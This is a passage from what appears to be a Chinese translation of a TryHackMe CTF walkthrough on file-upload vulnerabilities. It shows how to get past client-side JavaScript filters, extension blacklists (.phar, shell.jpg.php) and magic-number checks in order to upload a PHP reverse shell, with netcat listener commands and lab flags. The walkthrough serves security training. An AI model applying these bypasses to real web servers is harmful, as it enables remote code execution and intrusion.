kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">文件内容过滤:</strong></p><p id="b269" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">更复杂的过滤系统可能会扫描上传文件的全部内容，以确保它没有伪造扩展名、MIME类型和幻数。与大多数基本过滤系统相比，这是一个非常复杂的过程，因此不在此讨论。</p><p id="3a15" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">值得注意的是，这些过滤器本身都不是完美的——它们通常会相互结合使用，提供多层过滤器，从而显著增加上传的安全性。这些过滤器中的任何一个都可以应用于客户端、服务器端或两者。</p><p id="e189" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">类似地，不同的框架和语言都有自己固有的过滤和验证上传文件的方法。因此，可能会出现针对特定语言的攻击；例如，在PHP主要版本5之前，可以通过在恶意的<code class="fe oo op oq mu b">.php</code>文件后面附加一个空字节和一个有效的扩展名来绕过扩展名过滤器。最近，还可以将PHP代码注入到一个有效图像文件的exif数据中，然后强制服务器执行它。如果你有兴趣，欢迎你进一步研究这些东西。</p><ol class=""><li id="22c9" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">传统的服务器端脚本语言是什么？</li></ol><blockquote class="og oh oi"><p id="1c02" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:php </strong></p></blockquote><ol class=""><li id="6ea2" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">当通过文件扩展名进行验证时，您将接受的扩展名列表称为什么(服务器拒绝不在列表中的任何扩展名)？</li></ol><blockquote class="og oh oi"><p id="64ec" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:白名单</strong></p></blockquote><ol class=""><li id="dd2a" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">[研究]上传CSV文件时，您希望看到哪种MIME类型？</li></ol><blockquote class="og oh oi"><p id="a242" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:text/csv </strong></p></blockquote><h1 id="fbc2" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务7绕过客户端过滤</h1><p id="68b8" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">我们将从第一道(也是最薄弱的)防线开始:客户端过滤。</p><p id="4f42" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如前所述，客户端过滤非常容易被绕过，因为它完全发生在您控制的机器上。当你能接触到代码时，修改它是非常容易的。</p><p id="6312" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">有四种简单的方法可以绕过普通的客户端文件上传过滤器:</p><ol class=""><li id="7737" class="nn no iq ku b kv kw ky kz lb np lf nq lj nr ln of nt nu nv bi translated">关闭浏览器中的Javascript——如果网站不需要Javascript来提供基本功能，这也可以。如果完全关闭Javascript会阻止网站运行，那么其他方法会更好；否则，这可能是完全绕过客户端过滤器的有效方法。</li><li id="3d91" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">拦截并修改传入的页面。使用Burpsuite，我们可以拦截传入的网页，并在Javascript过滤器有机会运行之前将其去除。这一过程将在下面介绍。</li><li id="b234" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">拦截并修改文件上传。前一种方法在网页加载前有效，这种方法允许网页正常加载，但在文件已经通过(并被过滤器接受)后拦截文件上传。同样，我们将介绍在任务过程中使用这种方法的过程。</li><li id="2414" class="nn no iq ku b kv nw ky nx lb ny lf nz lj oa ln of nt nu nv bi translated">将文件直接发送到上传点。既然可以使用<code class="fe oo op oq mu b">curl</code>这样的工具直接发送文件，为什么还要使用带有过滤器的网页呢？将数据直接发布到包含处理文件上传的代码的页面是另一种完全绕过客户端过滤器的有效方法。在本教程中，我们不会深入讨论这个方法，但是，这样一个命令的语法应该是这样的:<strong class="ku ir">curl-X POST-F " submit:&lt;value&gt;-F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;"&lt;site&gt;</strong>。要使用这种方法，您首先要拦截一次成功的上传(使用Burpsuite或浏览器控制台),以查看上传中使用的参数，然后可以将这些参数插入到上面的命令中。</li></ol><p id="3e4d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们将在下面深入讨论方法二和方法三。</p><p id="4c66" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们再次假设，我们在网站上找到了一个上传页面:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/7fbf3385c95488d4366d85f64e419f04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/0*qTi_OwOa8jE7atAd"/></div></figure><p id="3dfe" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">像往常一样，我们将看看源代码。这里我们看到一个基本的Javascript函数检查上传文件的MIME类型:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pk"><img src="../Images/467d15f05bfadff5fc079741313bb059.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*147pbfGUSJQQXOBC"/></div></div></figure><p id="35c9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在这个例子中，我们可以看到过滤器使用白名单来排除任何不是<code class="fe oo op oq mu b">image/jpeg</code>的MIME类型。</p><p id="626b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们的下一步是尝试文件上传——正如所料，如果我们选择JPEG，函数会接受它。否则上传将被拒绝。</p><p id="fddf" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">建立了这个，让我们开始<a class="ae kr" href="https://blog.tryhackme.com/setting-up-burp/" rel="noopener ugc nofollow" target="_blank"> Burpsuite </a>并重新加载页面。我们将看到自己对站点的请求，但我们真正想看到的是服务器的响应，所以右键单击截取的数据，向下滚动到“Do Intercept”，然后选择“Response to this request”:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/27379f62bbb45f5dad3e21471eefb10a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/0*tAaFa3qi5xXD9dC5"/></div></figure><p id="e37b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当我们单击窗口顶部的“转发”按钮时，我们将看到服务器对我们请求的响应。在这里，我们可以在Javascript函数有机会加载之前删除、注释掉或以其他方式中断它:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pm"><img src="../Images/afe38440bb0951de0ca195d677aa05d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Wh1Jn9d20g-YQXGv"/></div></div></figure><p id="c27a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">删除该功能后，我们再次单击“转发”,直到网站完成加载，现在可以自由上传任何类型的文件到网站:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/86e54cf765a84a72a76b690194e076bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1098/0*CIRdwl5y09qG3_dR"/></div></figure><p id="cb1f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这里值得注意的是，默认情况下，Burpsuite不会拦截网页正在加载的任何外部Javascript文件。如果您需要编辑一个不在正在加载的主页面中的脚本，您需要转到Burpsuite窗口顶部的“选项”选项卡，然后在“拦截客户端请求”部分下，编辑第一行的条件以删除<code class="fe oo op oq mu b">^js$|</code>:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi po"><img src="../Images/980d890138675dc852e28fb305b91d77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*jbq-78G2GfTkixtB"/></div></div></figure><p id="d529" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们已经通过在页面加载之前拦截并删除它绕过了这个过滤器，但是让我们通过上传一个具有合法扩展名和MIME类型的文件，然后用Burpsuite拦截并纠正上传来尝试这样做。</p><p id="df05" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在重新加载网页以将过滤器放回原位后，让我们将之前使用的反向shell重命名为“shell.jpg”。当MIME类型(基于文件扩展名)自动检查出来时，客户端过滤器让我们的有效负载通过，而没有抱怨:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/06368449d3a0e8f93bfd78032d8cb829.png" data-original-src="https://miro.medium.com/v2/resize:fit:946/0*NF4v0peztHUf8k-4"/></div></figure><p id="ab3f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们将再次激活我们的Burpsuite拦截，然后单击“上传”并捕获请求:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pq"><img src="../Images/aade4149e5dc726abf15451a4780394b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*kDdtQYwBzfPvxYnw"/></div></div></figure><p id="444a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">注意到我们的PHP shell的MIME类型目前是<code class="fe oo op oq mu b">image/jpeg</code>。我们将把它改为<code class="fe oo op oq mu b">text/x-php</code>，文件扩展名从<code class="fe oo op oq mu b">.jpg</code>改为<code class="fe oo op oq mu b">.php</code>，然后将请求转发给服务器:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pr"><img src="../Images/07d84ff760b480b0fda387e90323e7de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/0*CCkf3zwPn1uCdReL"/></div></figure><p id="9476" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在，当我们导航到已经设置了netcat监听器的<a class="ae kr" href="http://demo.uploadvulns.thm/uploads/shell.php" rel="noopener ugc nofollow" target="_blank">http://demo.uploadvulns.thm/uploads/shell.php</a>时，我们接收到来自shell的连接！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ps"><img src="../Images/bf62a4229c9a86c2c372466e09fc95a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xZFbhIVuR4H86shu"/></div></div></figure><p id="904b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们已经详细介绍了两种绕过客户端文件上传过滤器的方法。现在是你自己尝试一下的时候了！导航到<a class="ae kr" href="/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/java.uploadvulns.thm" rel="noopener ugc nofollow" target="_blank"> java.uploadvulns.thm </a>，绕过过滤器得到一个反向shell。请记住，并不是所有的客户端脚本都是内联的！如前所述，Gobuster将是一个非常好的起点——上传目录名称将随着每个新的挑战而改变。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="b3ea" class="my lx iq mu b gy mz na l nb nc">window.onload = function(){<br/>	var upload = document.getElementById("fileSelect");<br/>	var responseMsg = document.getElementsByClassName("responseMsg")[0];<br/>	var errorMsg = document.getElementById("errorMsg");<br/>	var uploadMsg = document.getElementById("uploadtext");<br/>	upload.value="";<br/>	upload.addEventListener("change",function(event){<br/>		var file = this.files[0];<br/>		responseMsg.style = "display:none;";<br/>		if (file.type != "image/png"){<br/>			upload.value = "";<br/>			uploadMsg.style = "display:none;";<br/>			error();<br/>		} else{<br/>			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();<br/>			responseMsg.style="display:none;";<br/>			errorMsg.style="display:none;";<br/>			success();<br/>		}<br/>	});<br/>};</span></pre><p id="7221" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">nc -lnvp 9001</p><p id="5548" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">问题1 </strong>。/var/www/中的标志是什么？</p><blockquote class="og oh oi"><p id="df37" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:THM { ndllzdqxnjjjote 0 ywnhzgy 3 yjljnme 2 }</strong></p></blockquote><h1 id="0e8e" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务8绕过服务器端过滤:文件扩展名</h1><p id="7f66" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">是时候让事情更上一层楼了！</p><p id="e7ce" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">客户端过滤器很容易被绕过——你可以看到它们的代码，即使它已经被混淆，需要在你阅读之前进行处理；但是当你看不到或者操作不了代码的时候会发生什么呢？嗯，那是服务器端的过滤器。简而言之，我们必须进行大量的测试，以建立一个概念，什么是允许的，什么是不允许的，然后逐渐地将符合限制的有效载荷放在一起。</p><p id="a0cf" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">对于这项任务的第一部分，我们将看看一个使用文件扩展名黑名单作为服务器端过滤器的网站。有各种不同的方式可以编码，我们使用的旁路取决于这一点。在现实世界中，我们看不到这方面的代码，但在本例中，它将包含在这里:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="6172" class="my lx iq mu b gy mz na l nb nc">&lt;?php<br/>    //Get the extension<br/>    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];<br/>    //Check the extension against the blacklist -- .php and .phtml<br/>    switch($extension){<br/>        case "php":<br/>        case "phtml":<br/>        case NULL:<br/>            $uploadFail = True;<br/>            break;<br/>        default:<br/>            $uploadFail = False;<br/>    }<br/>?&gt;</span></pre><p id="2a5e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在这种情况下，代码查找最后一个句点(。)并使用它来确认扩展名，这就是我们在这里要绕过的。代码可能工作的其他方式包括:搜索文件名中的第一个句点，或者在每个句点处拆分文件名，并检查是否出现任何黑名单中的扩展名。我们稍后将讨论后一种情况，但同时，让我们把注意力集中在这里的代码上。</p><p id="455a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们可以看到代码过滤掉了<code class="fe oo op oq mu b">.php</code>和<code class="fe oo op oq mu b">.phtml</code>扩展名，所以如果我们想上传一个PHP脚本，我们必须找到另一个扩展名。PHP的<a class="ae kr" href="https://en.wikipedia.org/wiki/PHP" rel="noopener ugc nofollow" target="_blank">维基百科页面</a>给了我们一堆可以尝试的选项——其中许多绕过了过滤器(过滤器只屏蔽了前面提到的两个扩展名),但是似乎服务器被配置成不识别它们为PHP文件，如下例所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pt"><img src="../Images/7ce73584cddedaf4a90ba10445097ea7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*RsmRsizaxDuoT2yN"/></div></div></figure><p id="dbcf" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在撰写本文时，这实际上是Apache2服务器的默认设置；但是，sysadmin可能已经更改了默认配置(或者服务器可能已经过时)，所以很值得一试。</p><p id="8776" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">最终我们发现<strong class="ku ir">。phar </strong>扩展绕过了过滤器——并且起作用了——从而给了我们外壳:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pu"><img src="../Images/85e867e728c0cce46a71b08e58e2df9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ma6NPjkuuGj9kzm_"/></div></div></figure><p id="84f2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们看看另一个例子，使用不同的过滤器。这一次我们将完全黑箱化:即没有源代码。</p><p id="38d1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">同样，我们有自己的上传表单:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/bc3fa36f71cf833e3d01f18b9942e5fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/0*ifM7qDT7Lz_Ci36c"/></div></figure><p id="61b2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">好的，我们从完全合法的上传开始。让我们试着上传之前的<code class="fe oo op oq mu b">spaniel.jpg</code>图片:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pw"><img src="../Images/4ca815830a5124a047d37124f439d28b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/0*ZQC6BZLnIr20PbIS"/></div></figure><p id="e760" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嗯，这告诉我们至少JPEGS是被接受的。让我们去找一个我们很确定会被拒绝的吧(<code class="fe oo op oq mu b">shell.php</code>):</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi px"><img src="../Images/7b7b4e26a692d1a5bdc2e5e649e2a363.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/0*aQ7By7jXdUsnI9iJ"/></div></figure><p id="d49a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">不能说这是意料之外的。</p><p id="9bb4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从这里，我们进一步列举，尝试上面的技术，只是一般试图得到一个过滤器将接受或拒绝的想法。</p><p id="8ecc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在这种情况下，我们发现没有既执行又不过滤的shell扩展，所以又回到了绘图板。</p><p id="5610" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在前面的例子中，我们看到代码使用了<code class="fe oo op oq mu b">pathinfo()</code> PHP函数来获取<code class="fe oo op oq mu b">.</code>之后的最后几个字符，但是如果它过滤输入的方式略有不同，会发生什么呢？</p><p id="ee18" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们试着上传一个名为<code class="fe oo op oq mu b">shell.jpg.php</code>的文件。我们已经知道JPEG文件是可以接受的，那么如果过滤器只是检查。jpg文件扩展名在输入的某个地方？</p><p id="a6e4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这种过滤器的伪代码可能如下所示:</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="b0fe" class="my lx iq mu b gy mz na l nb nc">ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput<br/>IF STRING ".jpg" IS IN VARIABLE userInput:<br/>    SAVE THE FILE<br/>ELSE:<br/>    RETURN ERROR MESSAGE</span></pre><p id="850b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当我们试图上传我们的文件时，我们得到一个成功的消息。导航到<code class="fe oo op oq mu b">/uploads</code>目录，确认有效载荷已成功上传:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi py"><img src="../Images/77d2aa6529ddfc4ddaa6783e48882caf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1234/0*uClMdz-nhnrlnqV_"/></div></div></figure><p id="eeac" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">激活它，我们收到我们的外壳:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pz"><img src="../Images/638dea97936b75e70cf68f639e675958.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*-XMoaS2I060PeokV"/></div></div></figure><p id="c7b6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这绝不是与文件扩展名相关的上传漏洞的详尽列表。正如黑客攻击中的所有事情一样，我们希望利用他人编写的代码中的缺陷；这段代码很可能是专门为手头的任务编写的。这是从这项任务中得到的真正重要的一点:对于编程来说，有一百万种不同的方法来实现相同的功能——您的开发必须适合手边的过滤器。绕过任何类型的服务器端过滤器的关键是枚举和查看什么是允许的，以及什么是阻止的；然后尝试制作一个有效载荷，它可以通过过滤器正在寻找的标准。</p><p id="f850" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在轮到你了。现在您已经知道该如何操作了——找出并绕过过滤器来上传并激活一个shell。你的旗帜在<code class="fe oo op oq mu b">/var/www/</code>。您正在访问的网站是<code class="fe oo op oq mu b">annex.uploadvulns.thm</code>。</p><p id="32fd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">要知道这个任务也是第一次实现了随机命名方案。现在你应该不会有任何问题找到你的shell，但是请注意目录并不总是可索引的…</p><p id="4c76" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="http://annex.uploadvulns.thm/privacy/" rel="noopener ugc nofollow" target="_blank">http://annex.uploadvulns.thm/privacy/</a></p><p id="eda2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/annex.uploadvulns.thm/privacy/2020-11-16-20-11-29-php-reverse-shell.jpg.php5" rel="noopener ugc nofollow" target="_blank">annex . uploadvulns . thm/privacy/2020–11–16–20–11–29-PHP-reverse-shell . jpg . PHP 5</a></p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="febe" class="my lx iq mu b gy mz na l nb nc">nc -lnvp 9001</span></pre><p id="72a2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">/var/www/中的标志是什么？</p><blockquote class="og oh oi"><p id="cba0" class="ks kt lo ku b kv kw jr kx ky kz ju la oj lc ld le ok lg lh li ol lk ll lm ln ij bi translated"><strong class="ku ir">答案:THM { mgeyyzjiymi 3 ody m2 flntnknjzjyjfl }</strong></p></blockquote><h1 id="2241" class="lw lx iq bd ly lz ni mb mc md nj mf mg jw nk jx mi jz nl ka mk kc nm kd mm mn bi translated">任务9绕过服务器端过滤:幻数</h1><p id="ee0a" class="pw-post-body-paragraph ks kt iq ku b kv mo jr kx ky mp ju la lb mq ld le lf mr lh li lj ms ll lm ln ij bi translated">我们已经了解了服务器端的扩展过滤，但是让我们借此机会看看如何将幻数检查实现为服务器端的过滤器。</p><p id="e888" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如前所述，幻数被用作更准确的文件标识符。文件的幻数是一串十六进制数字，并且总是文件中的第一个数字。了解了这一点，就有可能使用幻数来验证文件上传，只需读取最初的几个字节，然后将它们与白名单或黑名单进行比较。请记住，这种技术对基于PHP的web服务器非常有效；但是，对于其他类型的web服务器，它有时会失败。</p><p id="a33b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们看一个例子。像往常一样，我们有一个上传页面:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/7659efb11d6d2a784edc8250f961073b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1020/0*r3ieizdURtdoH-tI"/></div></figure><p id="ba0a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">正如所料，如果我们上传我们的标准shell.php文件，我们得到一个错误；然而，如果我们上传一个JPEG文件，网站就没问题了。到目前为止一切正常。</p><p id="bd71" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">从之前的上传尝试中，我们知道JPEG文件是可以接受的，所以让我们尝试将JPEG幻数添加到我们的<code class="fe oo op oq mu b">shell.php</code>文件的顶部。快速浏览一下维基百科上的<a class="ae kr" href="https://en.wikipedia.org/wiki/List_of_file_signatures" rel="noopener ugc nofollow" target="_blank">文件签名列表，我们会发现JPEG文件有几种可能的幻数。我们在这里使用哪个应该无关紧要，所以我们只选择一个(<code class="fe oo op oq mu b">FF D8 FF DB</code>)。我们可以将这些数字的ASCII表示(ÿøÿû)直接添加到文件的顶部，但是直接使用十六进制表示通常更容易，所以让我们来介绍一下这种方法。</a></p><p id="b213" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在我们开始之前，让我们使用<code class="fe oo op oq mu b">Linux</code>文件命令来检查我们的shell的文件类型:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qb"><img src="../Images/c565dc07de83304289fbca84abddbb13.png" data-original-src="https://miro.medium.com/v2/resize:fit:738/0*k1GjGfCnoFK5zKFf"/></div></figure><p id="436f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">正如所料，该命令告诉我们文件类型是PHP。在我们继续解释时，请记住这一点。</p><p id="aea7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们可以看到我们选择的幻数有四个字节长，所以让我们打开反向shell脚本，在第一行添加四个随机字符。这些字符无关紧要，因此在本例中，我们只使用四个“A ”:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/9299ba2ec063924eb3effc49e83820d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/0*PNLMK9cvwCp3eqZu"/></div></figure><p id="0542" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">保存文件并退出。接下来，我们将在hex editor(Kali上默认提供)中重新打开该文件，或者任何其他允许您以hex格式查看和编辑shell的工具。在hexeditor中，文件如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi pi"><img src="../Images/13c34b40168fbdfaaf148f2d0e55bfd6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*4j3PuAUy1xI5r1CZ"/></div></div></figure><p id="ae39" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">请注意红框中的四个字节:它们都是41，这是大写字母“A”的十六进制代码，正是我们之前在文件顶部添加的内容。</p><p id="2d66" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky 